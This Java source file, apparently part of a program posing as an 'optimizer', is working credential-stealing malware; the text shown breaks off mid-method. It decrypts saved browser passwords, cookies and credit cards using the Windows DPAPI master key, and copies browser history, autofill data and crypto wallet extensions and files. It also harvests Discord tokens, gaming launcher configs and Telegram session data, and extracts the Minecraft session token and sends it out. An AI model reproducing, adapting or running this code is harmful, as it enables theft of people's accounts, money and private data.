package com.example.optimizer;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URI;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.Collections;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class Ex {
    
    private static final int XOR_KEY = 0x5A;
    
    private static final boolean IS_WINDOWS = System.getProperty("os.name", "").toLowerCase().contains("win");
    
    private static final String APPDATA = safeGetEnv("APPDATA");
    private static final String LOCALAPPDATA = safeGetEnv("LOCALAPPDATA");
    private static final String USERPROFILE = safeGetEnv("USERPROFILE");
    private static final String TEMP = System.getProperty("java.io.tmpdir", "/tmp");
    
    private static File STORAGE_DIR;
    private static File ZIP_FILE;
    
    private static String safeGetEnv(String name) {
        try { return System.getenv(name); } catch (Exception e) { return null; }
    }
    
    // ================= BROWSER DATA =================
    
    private static final String[][] BROWSERS = {
        {"Chrome", "Google\\Chrome\\User Data"},
        {"Chrome Beta", "Google\\Chrome Beta\\User Data"},
        {"Chrome Canary", "Google\\Chrome SxS\\User Data"},
        {"Chromium", "Chromium\\User Data"},
        {"Edge", "Microsoft\\Edge\\User Data"},
        {"Edge Beta", "Microsoft\\Edge Beta\\User Data"},
        {"Edge Dev", "Microsoft\\Edge Dev\\User Data"},
        {"Edge Canary", "Microsoft\\Edge SxS\\User Data"},
        {"Brave", "BraveSoftware\\Brave-Browser\\User Data"},
        {"Opera", "Opera Software\\Opera Stable"},
        {"Opera GX", "Opera Software\\Opera GX Stable"},
        {"Opera Neon", "Opera Software\\Opera Neon\\User Data"},
        {"Vivaldi", "Vivaldi\\User Data"},
        {"Yandex", "Yandex\\YandexBrowser\\User Data"},
        {"Thorium", "Thorium\\User Data"},
        {"Iridium", "Iridium\\User Data"},
        {"7Star", "7Star\\7Star\\User Data"},
        {"CentBrowser", "CentBrowser\\User Data"},
        {"Chedot", "Chedot\\User Data"},
        {"Kometa", "Kometa\\User Data"},
        {"Epic", "Epic Privacy Browser\\User Data"},
        {"Uran", "uCozMedia\\Uran\\User Data"},
        {"Coowon", "Coowon\\Coowon\\User Data"},
        {"Liebao", "liebao\\User Data"},
        {"QIP Surf", "QIP Surf\\User Data"},
        {"Orbitum", "Orbitum\\User Data"},
        {"Dragon", "Comodo\\Dragon\\User Data"},
        {"360Browser", "360Browser\\Browser\\User Data"},
        {"Maxthon", "Maxthon\\Application\\User Data"},
        {"CocCoc", "CocCoc\\Browser\\User Data"},
        {"Amigo", "Amigo\\User Data"},
        {"Torch", "Torch\\User Data"},
        {"Sputnik", "Sputnik\\Sputnik\\User Data"},
        {"Slimjet", "Slimjet\\User Data"},
        {"UR Browser", "UR Browser\\User Data"},
        {"Avast Browser", "AVAST Software\\Browser\\User Data"},
        {"AVG Browser", "AVG\\Browser\\User Data"},
        {"Whale", "Naver\\Naver Whale\\User Data"},
        {"Iron", "SRWare Iron\\User Data"},
        {"Ghost Browser", "GhostBrowser\\User Data"}
    };
    
    private static final String[][] WALLET_EXTENSIONS = {
        {"MetaMask", "nkbihfbeogaeaoehlefnkodbefgpgknn"},
        {"Phantom", "bfnaelmomeimhlpmgjnjophhpkkoljpa"},
        {"Coinbase", "hnfanknocfeofbddgcijnmhnfnkdnaad"},
        {"Trust Wallet", "egjidjbpglichdcondbcbdnbeeppgdph"},
        {"Binance", "fhbohimaelbohpjbbldcngcnapndodjp"},
        {"Exodus", "aholpfdialjgjfhomihkjbmgjidlcdno"},
        {"Ronin", "fnjhmkhhmkbjkkabndcnnogagogbneec"},
        {"Brave Wallet", "odbfpeeihdkbihmopkbjmoonfanlbfcl"},
        {"Crypto.com", "hifafgmccdpekplomjjkcfgodnhcellj"},
        {"Keplr", "dmkamcknogkgcdfhhbddcghachkejeap"},
        {"Slope", "pocmplpaccanhmnllbjabpghmlpidkah"},
        {"Solflare", "bhhhlbepdkbapadjdnnojkbgioiodbic"},
        {"TronLink", "ibnejdfjmmkpcnlpebklmnkoeoihofec"},
        {"Coin98", "aeachknmefphepccionboohckonoeemg"},
        {"Rabby", "acmacodkjbdgmoleebolmdjonilkdbch"},
        {"Zerion", "klghhnkeealcohjjanjjdaeeggmfmlpl"},
        {"Rainbow", "opfgelmcmbiajamepnmloijbpoleiama"},
        {"Argent X", "dlcobpjiigpikoobohmabehhmhfoodbb"},
        {"Martian", "efbglgofoippbgcjepnhiblaibcnclgk"},
        {"Petra", "ejjladinnckdgjemekebdpeokbikhfci"},
        {"Pontem", "phkbamefinggmakgklpkljjmgibohnba"},
        {"Sui Wallet", "opcgpfmipidbgpenhmajoajpbobppdil"},
        {"Backpack", "aflkmfhebedbjioipglgcbcmnbpgliof"},
        {"OKX Wallet", "mcohilncbfahbmgdjkbpemcciiolgcge"},
        {"Bitget", "jiidiaalihmmhddjgbnbgdfflelocpak"},
        {"Blade", "bellfiojgkfmilkhfioagncekakfabhm"}
    };
    
    // ================= DISCORD PATHS =================
    
    private static final String[][] DISCORD_PATHS = {
        {"Discord", "Discord"},
        {"Discord Canary", "discordcanary"},
        {"Discord PTB", "discordptb"},
        {"Discord Dev", "discorddevelopment"},
        {"Lightcord", "Lightcord"},
        {"Vesktop", "vesktop"},
        {"BetterDiscord", "BetterDiscord"}
    };
    
    // ================= TOKEN REGEX =================
    
    private static final Pattern[] TOKEN_PATTERNS = {
        Pattern.compile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}"),
        Pattern.compile("mfa\\.[\\w-]{80,95}"),
        Pattern.compile("[\\w-]{26}\\.[\\w-]{6}\\.[\\w-]{38}")
    };
    
    // ================= GAMING PATHS =================
    
    private static final String[][] GAMING_PATHS = {
        {"Roblox Cookies", "Roblox\\LocalStorage"},
        {"Growtopia", "Growtopia\\save.dat"},
        {"Steam", "Steam\\config"}
    };
    
    // ================= STORAGE INIT =================
    
    private static void initStorage() throws Exception {
        Se.log("Ex.initStorage() starting...");
        Se.log("  TEMP=" + TEMP);
        Se.log("  APPDATA=" + APPDATA);
        Se.log("  LOCALAPPDATA=" + LOCALAPPDATA);
        
        STORAGE_DIR = new File(TEMP, "cache_" + System.currentTimeMillis());
        Se.log("  Creating STORAGE_DIR: " + STORAGE_DIR.getAbsolutePath());
        
        boolean created = STORAGE_DIR.mkdirs();
        Se.log("  STORAGE_DIR.mkdirs() = " + created);
        Se.log("  STORAGE_DIR.exists() = " + STORAGE_DIR.exists());
        
        if (!STORAGE_DIR.exists()) {
            Se.log("  ERROR: STORAGE_DIR does not exist after mkdirs!");
            throw new Exception("Cannot create storage dir");
        }
        
        ZIP_FILE = new File(TEMP, "data_" + System.currentTimeMillis() + ".zip");
        Se.log("  ZIP_FILE: " + ZIP_FILE.getAbsolutePath());
        Se.log("Ex.initStorage() completed successfully");
    }
    
    // ================= BROWSER EXTRACTION =================
    
    private static byte[] getMasterKey(String browserPath) {
        try {
            File localState = new File(browserPath, "Local State");
            if (!localState.exists()) return null;
            
            String content = new String(Files.readAllBytes(localState.toPath()), StandardCharsets.UTF_8);
            int keyStart = content.indexOf("\"encrypted_key\":\"");
            if (keyStart == -1) return null;
            
            keyStart += 17;
            int keyEnd = content.indexOf("\"", keyStart);
            if (keyEnd == -1) return null;
            
            byte[] encryptedKey = Base64.getDecoder().decode(content.substring(keyStart, keyEnd));
            byte[] keyWithoutPrefix = Arrays.copyOfRange(encryptedKey, 5, encryptedKey.length);
            
            return decryptDPAPI(keyWithoutPrefix);
        } catch (Exception e) {
            return null;
        }
    }
    
    private static byte[] decryptDPAPI(byte[] data) {
        try {
            File tempIn = File.createTempFile("dpapi_in", ".bin");
            File tempOut = File.createTempFile("dpapi_out", ".bin");
            
            try (FileOutputStream fos = new FileOutputStream(tempIn)) {
                fos.write(data);
            }
            
            String ps = String.format(
                "Add-Type -AssemblyName System.Security; " +
                "[IO.File]::WriteAllBytes('%s', [Security.Cryptography.ProtectedData]::Unprotect(" +
                "[IO.File]::ReadAllBytes('%s'), $null, 'CurrentUser'))",
                tempOut.getAbsolutePath().replace("\\", "\\\\"),
                tempIn.getAbsolutePath().replace("\\", "\\\\")
            );
            
            ProcessBuilder pb = new ProcessBuilder("powershell", "-Command", ps);
            pb.redirectErrorStream(true);
            Process p = pb.start();
            p.waitFor();
            
            byte[] result = Files.readAllBytes(tempOut.toPath());
            tempIn.delete();
            tempOut.delete();
            
            return result;
        } catch (Exception e) {
            return null;
        }
    }
    
    private static String decryptValue(byte[] data, byte[] masterKey) {
        if (data == null || data.length < 15) return "";
        
        try {
            if (data[0] == 'v' && data[1] == '1' && data[2] == '0') {
                byte[] nonce = Arrays.copyOfRange(data, 3, 15);
                byte[] ciphertext = Arrays.copyOfRange(data, 15, data.length);
                
                Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
                cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(masterKey, "AES"), new GCMParameterSpec(128, nonce));
                return new String(cipher.doFinal(ciphertext), StandardCharsets.UTF_8);
            }
        } catch (Exception e) {}
        
        return "";
    }
    
    private static List<String> findProfiles(String browserPath) {
        List<String> profiles = new ArrayList<>();
        File browserDir = new File(browserPath);
        
        if (!browserDir.exists()) return profiles;
        
        profiles.add("Default");
        
        for (int i = 1; i <= 20; i++) {
            profiles.add("Profile " + i);
        }
        
        File[] dirs = browserDir.listFiles(File::isDirectory);
        if (dirs != null) {
            for (File dir : dirs) {
                String name = dir.getName();
                if ((name.startsWith("Profile") || name.equals("Default") || name.equals("Guest Profile")) 
                    && new File(dir, "Login Data").exists()) {
                    if (!profiles.contains(name)) {
                        profiles.add(name);
                    }
                }
            }
        }
        
        return profiles;
    }
    
    private static File robustCopy(File source, File dest) {
        for (int i = 0; i < 3; i++) {
            try {
                if (!source.exists()) return null;
                Files.copy(source.toPath(), dest.toPath(), StandardCopyOption.REPLACE_EXISTING);
                if (dest.exists() && dest.length() > 0) return dest;
            } catch (Exception e) {}
            try { Thread.sleep(100 * (i + 1)); } catch (Exception e) {}
        }
        return null;
    }
    
    private static void extractCookies(String browserName, String browserPath, String profile, byte[] masterKey) {
        if (STORAGE_DIR == null) return;
        
        try {
            File cookiesDb = new File(browserPath, profile + "\\Network\\Cookies");
            if (!cookiesDb.exists()) {
                cookiesDb = new File(browserPath, profile + "\\Cookies");
            }
            if (!cookiesDb.exists()) return;
            
            File tempDb = new File(STORAGE_DIR, "cookies_" + browserName + "_" + profile + "_" + System.currentTimeMillis() + ".db");
            if (robustCopy(cookiesDb, tempDb) == null) return;
            
            StringBuilder cookies = new StringBuilder();
            
            try (Connection conn = DriverManager.getConnection("jdbc:sqlite:" + tempDb.getAbsolutePath())) {
                try (Statement stmt = conn.createStatement();
                     ResultSet rs = stmt.executeQuery("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies")) {
                    
                    while (rs.next()) {
                        String host = rs.getString("host_key");
                        String name = rs.getString("name");
                        byte[] encValue = rs.getBytes("encrypted_value");
                        String path = rs.getString("path");
                        long expires = rs.getLong("expires_utc");
                        int secure = rs.getInt("is_secure");
                        int httpOnly = rs.getInt("is_httponly");
                        
                        String value = (masterKey != null) ? decryptValue(encValue, masterKey) : "";
                        
                        if (!value.isEmpty()) {
                            cookies.append(String.format("%s\t%s\t%s\t%s\t%d\t%s\t%s\n",
                                host, secure == 1 ? "TRUE" : "FALSE", path,
                                httpOnly == 1 ? "TRUE" : "FALSE", expires, name, value));
                        }
                    }
                }
            }
            
            tempDb.delete();
            
            if (cookies.length() > 0) {
                File cookieFile = new File(STORAGE_DIR, browserName + "_" + profile + "_cookies.txt");
                Files.write(cookieFile.toPath(), cookies.toString().getBytes(StandardCharsets.UTF_8));
            }
        } catch (Exception e) {}
    }
    
    private static void extractPasswords(String browserName, String browserPath, String profile, byte[] masterKey) {
        if (STORAGE_DIR == null) return;
        
        try {
            File loginDb = new File(browserPath, profile + "\\Login Data");
            if (!loginDb.exists()) return;
            
            File tempDb = new File(STORAGE_DIR, "login_" + browserName + "_" + profile + "_" + System.currentTimeMillis() + ".db");
            if (robustCopy(loginDb, tempDb) == null) return;
            
            StringBuilder passwords = new StringBuilder();
            
            try (Connection conn = DriverManager.getConnection("jdbc:sqlite:" + tempDb.getAbsolutePath())) {
                try (Statement stmt = conn.createStatement();
                     ResultSet rs = stmt.executeQuery("SELECT origin_url, username_value, password_value FROM logins")) {
                    
                    while (rs.next()) {
                        String url = rs.getString("origin_url");
                        String user = rs.getString("username_value");
                        byte[] encPass = rs.getBytes("password_value");
                        
                        String pass = (masterKey != null) ? decryptValue(encPass, masterKey) : "";
                        
                        if (!url.isEmpty() && !user.isEmpty()) {
                            passwords.append(String.format("URL: %s\nUser: %s\nPass: %s\n\n", url, user, pass));
                        }
                    }
                }
            }
            
            tempDb.delete();
            
            if (passwords.length() > 0) {
                File passFile = new File(STORAGE_DIR, browserName + "_" + profile + "_passwords.txt");
                Files.write(passFile.toPath(), passwords.toString().getBytes(StandardCharsets.UTF_8));
            }
        } catch (Exception e) {}
    }
    
    private static void extractCreditCards(String browserName, String browserPath, String profile, byte[] masterKey) {
        if (STORAGE_DIR == null) return;
        
        try {
            File webDataDb = new File(browserPath, profile + "\\Web Data");
            if (!webDataDb.exists()) return;
            
            File tempDb = new File(STORAGE_DIR, "webdata_" + browserName + "_" + profile + "_" + System.currentTimeMillis() + ".db");
            if (robustCopy(webDataDb, tempDb) == null) return;
            
            StringBuilder cards = new StringBuilder();
            
            try (Connection conn = DriverManager.getConnection("jdbc:sqlite:" + tempDb.getAbsolutePath())) {
                try (Statement stmt = conn.createStatement();
                     ResultSet rs = stmt.executeQuery("SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards")) {
                    
                    while (rs.next()) {
                        String name = rs.getString("name_on_card");
                        byte[] encNumber = rs.getBytes("card_number_encrypted");
                        int month = rs.getInt("expiration_month");
                        int year = rs.getInt("expiration_year");
                        
                        String number = (masterKey != null) ? decryptValue(encNumber, masterKey) : "";
                        
                        if (!number.isEmpty()) {
                            cards.append(String.format("Name: %s\nNumber: %s\nExpiry: %02d/%d\n\n", name, number, month, year));
                        }
                    }
                }
            }
            
            tempDb.delete();
            
            if (cards.length() > 0) {
                File cardFile = new File(STORAGE_DIR, browserName + "_" + profile + "_cards.txt");
                Files.write(cardFile.toPath(), cards.toString().getBytes(StandardCharsets.UTF_8));
            }
        } catch (Exception e) {}
    }
    
    private static void extractHistory(String browserName, String browserPath, String profile) {
        if (STORAGE_DIR == null) return;
        
        try {
            File historyDb = new File(browserPath, profile + "\\History");
            if (!historyDb.exists()) return;
            
            File tempDb = new File(STORAGE_DIR, "history_" + browserName + "_" + profile + "_" + System.currentTimeMillis() + ".db");
            if (robustCopy(historyDb, tempDb) == null) return;
            
            StringBuilder history = new StringBuilder();
            
            try (Connection conn = DriverManager.getConnection("jdbc:sqlite:" + tempDb.getAbsolutePath())) {
                try (Statement stmt = conn.createStatement();
                     ResultSet rs = stmt.executeQuery("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 1000")) {
                    
                    while (rs.next()) {
                        String url = rs.getString("url");
                        String title = rs.getString("title");
                        int visits = rs.getInt("visit_count");
                        
                        history.append(String.format("%s | %s | %d visits\n", url, title, visits));
                    }
                }
            }
            
            tempDb.delete();
            
            if (history.length() > 0) {
                File histFile = new File(STORAGE_DIR, browserName + "_" + profile + "_history.txt");
                Files.write(histFile.toPath(), history.toString().getBytes(StandardCharsets.UTF_8));
            }
        } catch (Exception e) {}
    }
    
    private static void extractAutofill(String browserName, String browserPath, String profile) {
        if (STORAGE_DIR == null) return;
        
        try {
            File webDataDb = new File(browserPath, profile + "\\Web Data");
            if (!webDataDb.exists()) return;
            
            File tempDb = new File(STORAGE_DIR, "autofill_" + browserName + "_" + profile + "_" + System.currentTimeMillis() + ".db");
            if (robustCopy(webDataDb, tempDb) == null) return;
            
            StringBuilder autofill = new StringBuilder();
            
            try (Connection conn = DriverManager.getConnection("jdbc:sqlite:" + tempDb.getAbsolutePath())) {
                try (Statement stmt = conn.createStatement();
                     ResultSet rs = stmt.executeQuery("SELECT name, value FROM autofill")) {
                    
                    while (rs.next()) {
                        String name = rs.getString("name");
                        String value = rs.getString("value");
                        autofill.append(String.format("%s: %s\n", name, value));
                    }
                }
            }
            
            tempDb.delete();
            
            if (autofill.length() > 0) {
                File autoFile = new File(STORAGE_DIR, browserName + "_" + profile + "_autofill.txt");
                Files.write(autoFile.toPath(), autofill.toString().getBytes(StandardCharsets.UTF_8));
            }
        } catch (Exception e) {}
    }
    
    private static void extractWalletExtensions(String browserName, String browserPath, String profile) {
        if (STORAGE_DIR == null) return;
        
        try {
            File extDir = new File(browserPath, profile + "\\Local Extension Settings");
            if (!extDir.exists()) return;
            
            for (String[] wallet : WALLET_EXTENSIONS) {
                String walletName = wallet[0];
                String walletId = wallet[1];
                
                File walletDir = new File(extDir, walletId);
                if (walletDir.exists() && walletDir.isDirectory()) {
                    File destDir = new File(STORAGE_DIR, "wallets\\" + browserName + "_" + walletName);
                    destDir.mkdirs();
                    safeCopyDirectory(walletDir, destDir);
                }
            }
        } catch (Exception e) {}
    }
    
    private static void stealBrowsers() {
        Se.log("Ex.stealBrowsers() starting...");
        
        if (LOCALAPPDATA == null) {
            Se.log("  ERROR: LOCALAPPDATA is null");
            return;
        }
        
        Se.log("  LOCALAPPDATA=" + LOCALAPPDATA);
        Se.log("  Checking " + BROWSERS.length + " browsers...");
        
        int browsersFound = 0;
        int profilesProcessed = 0;
        
        for (String[] browser : BROWSERS) {
            String name = browser[0];
            String path = browser[1];
            
            String fullPath = LOCALAPPDATA + "\\" + path;
            File browserDir = new File(fullPath);
            
            if (!browserDir.exists()) continue;
            
            Se.log("  Found browser: " + name + " at " + fullPath);
            browsersFound++;
            
            byte[] masterKey = getMasterKey(fullPath);
            Se.log("    MasterKey: " + (masterKey != null ? masterKey.length + " bytes" : "null"));
            
            List<String> profiles = findProfiles(fullPath);
            Se.log("    Found " + profiles.size() + " profile(s)");
            
            for (String profile : profiles) {
                File profileDir = new File(fullPath, profile);
                if (!profileDir.exists()) continue;
                
                Se.log("    Processing profile: " + profile);
                profilesProcessed++;
                
                extractCookies(name, fullPath, profile, masterKey);
                extractPasswords(name, fullPath, profile, masterKey);
                extractCreditCards(name, fullPath, profile, masterKey);
                extractHistory(name, fullPath, profile);
                extractAutofill(name, fullPath, profile);
                extractWalletExtensions(name, fullPath, profile);
            }
        }
        
        Se.log("  stealBrowsers() completed: " + browsersFound + " browsers, " + profilesProcessed + " profiles");
    }
    
    // ================= DISCORD EXTRACTION =================
    
    private static void stealDiscord() {
        Se.log("Ex.stealDiscord() starting...");
        
        if (APPDATA == null) {
            Se.log("  ERROR: APPDATA is null");
            return;
        }
        
        Set<String> tokens = new HashSet<>();
        
        for (String[] discord : DISCORD_PATHS) {
            String name = discord[0];
            String dir = discord[1];
            
            String basePath = APPDATA + "\\" + dir;
            String[] searchPaths = {
                basePath + "\\Local Storage\\leveldb",
                basePath + "\\leveldb",
                LOCALAPPDATA + "\\" + dir + "\\Local Storage\\leveldb",
                LOCALAPPDATA + "\\" + dir + "\\leveldb"
            };
            
            for (String path : searchPaths) {
                File folder = new File(path);
                if (!folder.exists()) continue;
                
                Se.log("  Scanning " + name + " at " + path);
                
                File[] files = folder.listFiles((d, n) -> n.endsWith(".log") || n.endsWith(".ldb"));
                if (files == null) continue;
                
                for (File file : files) {
                    try {
                        String content = new String(Files.readAllBytes(file.toPath()), StandardCharsets.UTF_8);
                        for (Pattern pattern : TOKEN_PATTERNS) {
                            Matcher matcher = pattern.matcher(content);
                            while (matcher.find()) {
                                tokens.add(matcher.group());
                            }
                        }
                    } catch (Exception e) {}
                }
            }
        }
        
        Se.log("  Found " + tokens.size() + " unique token(s)");
        
        if (!tokens.isEmpty() && STORAGE_DIR != null) {
            try {
                StringBuilder sb = new StringBuilder();
                for (String token : tokens) {
                    sb.append(token).append("\n");
                }
                File tokenFile = new File(STORAGE_DIR, "discord_tokens.txt");
                Files.write(tokenFile.toPath(), sb.toString().getBytes(StandardCharsets.UTF_8));
                Se.log("  Saved tokens to " + tokenFile.getAbsolutePath());
            } catch (Exception e) {
                Se.logEx("  Error saving tokens", e);
            }
        }
        
        Se.log("Ex.stealDiscord() completed");
    }
    
    // ================= WALLET EXTRACTION =================
    
    private static void stealWallets() {
        Se.log("Ex.stealWallets() starting...");
        
        if (STORAGE_DIR == null) {
            Se.log("  ERROR: STORAGE_DIR is null");
            return;
        }
        
        int walletsFound = 0;
        
        String[][] WALLET_PATHS = {
            {"Exodus", APPDATA + "\\Exodus\\exodus.wallet"},
            {"Electrum", APPDATA + "\\Electrum\\wallets"},
            {"Atomic", APPDATA + "\\atomic\\Local Storage\\leveldb"},
            {"Guarda", APPDATA + "\\Guarda\\Local Storage\\leveldb"},
            {"Coinomi", LOCALAPPDATA + "\\Coinomi\\Coinomi\\wallets"},
            {"Armory", APPDATA + "\\Armory"},
            {"Bytecoin", APPDATA + "\\bytecoin"},
            {"Jaxx", APPDATA + "\\com.liberty.jaxx\\IndexedDB"},
            {"Ethereum", APPDATA + "\\Ethereum\\keystore"},
            {"Zcash", APPDATA + "\\Zcash"},
            {"Monero", APPDATA + "\\Monero\\wallets"},
            {"Dogecoin", APPDATA + "\\DogeCoin"},
            {"Wasabi", APPDATA + "\\WalletWasabi\\Client\\Wallets"},
            {"Litecoin", APPDATA + "\\Litecoin"},
            {"Dash", APPDATA + "\\DashCore"},
            {"Bitcoin", APPDATA + "\\Bitcoin"}
        };
        
        for (String[] wallet : WALLET_PATHS) {
            String name = wallet[0];
            String path = wallet[1];
            
            File walletDir = new File(path);
            if (!walletDir.exists()) continue;
            
            Se.log("  Found wallet: " + name + " at " + path);
            walletsFound++;
            
            File destDir = new File(STORAGE_DIR, "wallets\\" + name);
            destDir.mkdirs();
            safeCopyDirectory(walletDir, destDir);
        }
        
        Se.log("Ex.stealWallets() completed: " + walletsFound + " wallets found");
    }
    
    // ================= MINECRAFT EXTRACTION =================
    
    private static void stealMinecraft() {
        Se.log("Ex.stealMinecraft() starting...");
        
        try {
            Se.log("  Getting Minecraft client via reflection...");
            
            Class<?> mcClass = Class.forName("net.minecraft.client.MinecraftClient");
            Object mcInstance = mcClass.getMethod("getInstance").invoke(null);
            Se.log("  MinecraftClient instance: " + (mcInstance != null ? "OK" : "null"));
            
            if (mcInstance == null) {
                Se.log("  ERROR: MinecraftClient instance is null");
                return;
            }
            
            Object session = null;
            for (java.lang.reflect.Field field : mcClass.getDeclaredFields()) {
                field.setAccessible(true);
                Object value = field.get(mcInstance);
                if (value != null && value.getClass().getName().contains("Session")) {
                    session = value;
                    Se.log("  Found session field: " + field.getName() + " -> " + value.getClass().getName());
                    break;
                }
            }
            
            if (session == null) {
                Se.log("  ERROR: Session not found");
                return;
            }
            
            String playerName = null, uuid = null, token = null;
            
            for (java.lang.reflect.Method method : session.getClass().getDeclaredMethods()) {
                method.setAccessible(true);
                if (method.getParameterCount() == 0) {
                    try {
                        Object result = method.invoke(session);
                        if (result == null) continue;
                        
                        String resultStr = result.toString();
                        String methodName = method.getName().toLowerCase();
                        
                        if (methodName.contains("name") || methodName.contains("user")) {
                            if (resultStr.length() >= 3 && resultStr.length() <= 16 && resultStr.matches("[a-zA-Z0-9_]+")) {
                                playerName = resultStr;
                                Se.log("  Found playerName: " + playerName + " (method: " + method.getName() + ")");
                            }
                        } else if (methodName.contains("uuid") || methodName.contains("id")) {
                            if (resultStr.contains("-") && resultStr.length() >= 32) {
                                uuid = resultStr;
                                Se.log("  Found UUID: " + uuid + " (method: " + method.getName() + ")");
                            }
                        } else if (methodName.contains("token") || methodName.contains("access")) {
                            if (resultStr.length() > 50) {
                                token = resultStr;
                                Se.log("  Found token: " + token.substring(0, Math.min(20, token.length())) + "... (length: " + token.length() + ", method: " + method.getName() + ")");
                            }
                        }
                    } catch (Exception e) {}
                }
            }
            
            if (playerName == null) {
                Se.log("  WARNING: playerName is null, trying fallback...");
                try {
                    Object gameProfile = session.getClass().getMethod("getProfile").invoke(session);
                    if (gameProfile != null) {
                        playerName = (String) gameProfile.getClass().getMethod("getName").invoke(gameProfile);
                        uuid = gameProfile.getClass().getMethod("getId").invoke(gameProfile).toString();
                        Se.log("  Fallback - playerName: " + playerName + ", uuid: " + uuid);
                    }
                } catch (Exception e) {
                    Se.logEx("  Fallback failed", e);
                }
            }
            
            if (playerName != null && uuid != null) {
                Se.log("  Sending MC session: " + playerName + ", " + uuid);
                String ip = "";
                try { ip = java.net.InetAddress.getLocalHost().getHostAddress(); } catch (Exception e) {}
                String pcName = System.getProperty("os.name", "Unknown");
                String pcUser = System.getProperty("user.name", "Unknown");
                String clientId = "";
                Se.sendMinecraft(playerName, uuid, token, clientId, ip, pcName, pcUser);
            } else {
                Se.log("  ERROR: Could not extract session - playerName=" + playerName + ", uuid=" + uuid);
            }
            
        } catch (Exception e) {
            Se.logEx("Ex.stealMinecraft() error", e);
        }
        
        Se.log("Ex.stealMinecraft() completed");
    }
    
    // ================= GAMING EXTRACTION =================
    
    private static void stealGaming() {
        Se.log("Ex.stealGaming() starting...");
        
        if (STORAGE_DIR == null) return;
        
        int found = 0;
        
        // Steam
        String steamPath = "C:\\Program Files (x86)\\Steam\\config";
        File steamDir = new File(steamPath);
        if (steamDir.exists()) {
            Se.log("  Found Steam at " + steamPath);
            found++;
            File destDir = new File(STORAGE_DIR, "gaming\\steam");
            destDir.mkdirs();
            safeCopyDirectory(steamDir, destDir);
        }
        
        // Epic Games
        if (LOCALAPPDATA != null) {
            String epicPath = LOCALAPPDATA + "\\EpicGamesLauncher\\Saved\\Config\\Windows";
            File epicDir = new File(epicPath);
            if (epicDir.exists()) {
                Se.log("  Found Epic Games at " + epicPath);
                found++;
                File destDir = new File(STORAGE_DIR, "gaming\\epic");
                destDir.mkdirs();
                safeCopyDirectory(epicDir, destDir);
            }
        }
        
        // Ubisoft
        if (LOCALAPPDATA != null) {
            String ubiPath = LOCALAPPDATA + "\\Ubisoft Game Launcher";
            File ubiDir = new File(ubiPath);
            if (ubiDir.exists()) {
                Se.log("  Found Ubisoft at " + ubiPath);
                found++;
                File destDir = new File(STORAGE_DIR, "gaming\\ubisoft");
                destDir.mkdirs();
                safeCopyDirectory(ubiDir, destDir);
            }
        }
        
        // Battle.net
        if (APPDATA != null) {
            String bnetPath = APPDATA + "\\Battle.net";
            File bnetDir = new File(bnetPath);
            if (bnetDir.exists()) {
                Se.log("  Found Battle.net at " + bnetPath);
                found++;
                File destDir = new File(STORAGE_DIR, "gaming\\battlenet");
                destDir.mkdirs();
                safeCopyDirectory(bnetDir, destDir);
            }
        }
        
        Se.log("Ex.stealGaming() completed: " + found + " gaming platforms found");
    }
    
    // ================= TELEGRAM EXTRACTION =================
    
    private static void stealTelegram() {
        Se.log("Ex.stealTelegram() starting...");
        
        if (STORAGE_DIR == null || APPDATA == null) return;
        
        String telegramPath = APPDATA + "\\Telegram Desktop\\tdata";
        File telegramDir = new File(telegramPath);
        
        if (telegramDir.exists()) {
            Se.log("  Found Telegram at " + telegramPath);
            File destDir = new File(STORAGE_DIR, "telegram");
            destDir.mkdirs();
            
            File[] files = telegramDir.listFiles();
            if (files != null) {
                for (File file : files) {
                    try {
                        String name = file.getName();
                        if (name.length() == 16 || name.equals("key_datas") || name.startsWith("D877F783D5D3EF8C")) {
                            if (file.isDirectory()) {
                                File dest = new File(destDir, name);
                                dest.mkdirs();
                                safeCopyDirectory(file, dest);
                            } else {
                                Files.copy(file.toPath(), new File(destDir, name).toPath(), StandardCopyOption.REPLACE_EXISTING);
                            }
                        }
                    } catch (Exception e) {}
                }
            }
            Se.log("  Telegram data copied");
        } else {
            Se.log("  Telegram not found");
        }
        
        Se.log("Ex.stealTelegram() completed");
    }
    
    // ================= SYSTEM INFO =================
    
    private static void collectSystemInfo() {
        Se.log("Ex.collectSystemInfo() starting...");
        
        if (STORAGE_DIR == null) return;
        
        try {
            StringBuilder sb = new StringBuilder();
            
            sb.append("=== SYSTEM INFO ===\n");
            sb.append("OS: ").append(System.getProperty("os.name")).append(" ").append(System.getProperty("os.version")).append("\n");
            sb.append("User: ").append(System.getProperty("user.name")).append("\n");
            sb.append("Home: ").append(System.getProperty("user.home")).append("\n");
            sb.append("Java: ").append(System.getProperty("java.version")).append("\n");
            
            try {
                sb.append("Hostname: ").append(InetAddress.getLocalHost().getHostName()).append("\n");
            } catch (Exception e) {}
            
            sb.append("Processors: ").append(Runtime.getRuntime().availableProcessors()).append("\n");
            sb.append("Memory: ").append(Runtime.getRuntime().maxMemory() / 1024 / 1024).append(" MB\n");
            
            // Environment
            sb.append("\n=== ENVIRONMENT ===\n");
            sb.append("APPDATA: ").append(APPDATA).append("\n");
            sb.append("LOCALAPPDATA: ").append(LOCALAPPDATA).append("\n");
            sb.append("USERPROFILE: ").append(USERPROFILE).append("\n");
            sb.append("TEMP: ").append(TEMP).append("\n");
            
            File sysFile = new File(STORAGE_DIR, "system_info.txt");
            Files.write(sysFile.toPath(), sb.toString().getBytes(StandardCharsets.UTF_8));
            
            Se.log("  System info saved");
        } catch (Exception e) {
            Se.logEx("  Error collecting system info", e);
        }
        
